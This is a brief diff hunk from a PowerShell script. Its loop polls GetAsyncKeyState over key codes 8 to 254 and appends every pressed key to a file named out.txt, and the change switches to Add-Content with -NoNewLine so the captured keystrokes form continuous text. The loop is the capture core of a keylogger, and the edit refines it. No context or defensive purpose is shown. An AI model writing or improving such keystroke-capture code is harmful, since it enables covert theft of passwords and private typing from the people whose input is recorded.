@@ -18,7 +18,8 @@ try{
         for ($key_num=8; $key_num -le 254; $key_num++){
             $key_pressed = [PsOneApi.Keyboard]::GetAsyncKeyState($key_num)
             if ($key_pressed -eq -32767){
-                echo [char]$key_num | Add-Content -Path '.\out.txt'
+                $asc = [char]$key_num
+                Add-Content -Path '.\out.txt' -Value $asc -NoNewLine
             }
         }
     }
